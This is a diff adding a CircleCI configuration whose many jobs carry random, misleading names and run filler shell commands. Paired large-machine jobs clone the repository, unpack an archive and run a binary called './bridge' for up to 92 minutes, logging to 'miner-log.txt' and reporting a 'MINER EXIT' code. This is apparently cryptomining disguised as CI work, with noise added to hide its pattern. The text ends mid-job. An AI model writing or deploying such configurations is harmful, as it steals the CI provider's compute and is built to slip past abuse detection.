@@ -1,0 +1,2069 @@
+version: 2.1
+
+jobs:
+  loadWierd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: PROBE MOTOR DRIVER CRITICAL
+          command: |
+            mkdir -p /tmp/handoff-04
+            set +o pipefail 2>/dev/null; seq 1 1219698 | tr '\n' ' ' | sha1sum > /tmp/handoff-04/PNG-forest; true
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'PNG-forest'
+  v1-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/PNG-forest 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  ConvertTo-MyContract:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: COMMIT 9B9C DISMISS
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 3 -type f -exec head -n 1 -q {} + 2>/dev/null | cat -n; true ; } > /tmp/handoff-04/green-flux-muon-dusty
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'green-flux-muon-dusty'
+  run-full-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/CarRieRaToLLPIXEl 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  fe-f5-b6-54:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Chill the blank in duplicate
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/thread_mock" && touch "/tmp/thread_mock"/a.tmp "/tmp/thread_mock"/b.tmp && find "/tmp/thread_mock" -name '*.tmp' -delete && ls -A "/tmp/thread_mock"; true ; } > /tmp/handoff-04/lvxav7dKa6Gm
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'lvxav7dKa6Gm'
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/lvxav7dKa6Gm 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  frank-dst:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Pick The Fragile Items By Noon
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; if test -k /tmp ; then echo ok; fi; true ; } > /tmp/handoff-04/exp8_4094
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'exp8_4094'
+  ValidateService:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/CarRieRaToLLPIXEl 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  lock_total:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Offboard 500 ID badges
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; for p in ivan tina carol hugo iris ivy; do echo "$p" | rev; done | head -n 3; true ; } > /tmp/handoff-04/20191220
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - '20191220'
+  hu-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/20191220 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  triggerPage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: 410 sync the spool directory
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; readarray -t id < <(seq 5); echo "${id[@]}"; true ; } > /tmp/handoff-04/8HvaZordrZI
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - '8HvaZordrZI'
+  qi-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/8HvaZordrZI 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  success_city_link_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Stop backing up the sessions table
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 1 -type d -iname '*' -mtime -365 -print0 | xargs -0r ls -ld; true ; } > /tmp/handoff-04/socket114
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'socket114'
+  QA_HOOK_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/socket114 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  interfaceVal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Audit the aisle 7 for route 8
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; { printf "%s\n" black green pink; } >"/tmp/upper-font-2024-03-19.conf" && sort "/tmp/upper-font-2024-03-19.conf"; true ; } > /tmp/handoff-04/4F63ATtToZ
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - '4F63ATtToZ'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/4F63ATtToZ 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  ms_fname_prod:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Pull the init containers first thing
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; if [ ! -c /dev/null ];then echo 'it is there'; else echo nope; fi; true ; } > /tmp/handoff-04/LCUU
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'LCUU'
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/LCUU 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  knnKNNLayer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Fully promote the referral bonuses
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; for p in $(seq 1 8); do printf '%d %d\n' ${p} $((p * 3)); done | paste -sd ' '; true ; } > /tmp/handoff-04/debug_20220817
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'debug_20220817'
+  oct20-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/debug_20220817 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  DelegatingRefDriver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Wait for the footer links to appear
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"}{print $6}' /etc/passwd | nl; true ; } > /tmp/handoff-04/crash.log.5
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'crash.log.5'
+  DATA-743:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/crash.log.5 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  l3v31:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Fortissimo survey
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; diff -q /etc/hosts /etc/shells || echo "files differ"; true ; } > /tmp/handoff-04/CASE-59928-AU
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'CASE-59928-AU'
+  ruby3-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/CASE-59928-AU 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  logIterateCb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: 26 sweep up the crash reports
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; echo 'the quick brown fox' | tee "/tmp/castle-token.csv" /tmp/draft-school.log >/dev/null && cat /tmp/draft-school.log; true ; } > /tmp/handoff-04/c0pp3rbr0nz3
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'c0pp3rbr0nz3'
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/c0pp3rbr0nz3 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  in:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: t58
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; for u in orange banana peach grape pear kiwi; do echo $u; done |paste -sd ' '; true ; } > /tmp/handoff-04/receipt
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'receipt'
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/receipt 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  cfg_StorePromise:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: reminder v4 final
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; shuf -i 1-983 -n 6| tail| xargs; true ; } > /tmp/handoff-04/patch.1.18
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'patch.1.18'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/patch.1.18 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  d14:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: First throttle the bandwidth cap
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; ls -1 /etc/default|sort|uniq -d|fmt -w 45|head -n1; true ; } > /tmp/handoff-04/Server
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'Server'
+  q4-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/CarRieRaToLLPIXEl 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  Zxc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Upload sidecar gen 5
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; ls --sort=version /etc/default | tac; true ; } > /tmp/handoff-04/v-6807
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'v-6807'
+  DATA-426:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/v-6807 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  profilesById:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: afk
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 2 -type d -name "std*" -ctime +100 -exec stat -c %n {} \; 2>/dev/null | xargs -r ls -ld | head -n5; true ; } > /tmp/handoff-04/qc7OYnP
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'qc7OYnP'
+  bug-2630:
+    machine:
+      image: ubuntu-2204:current
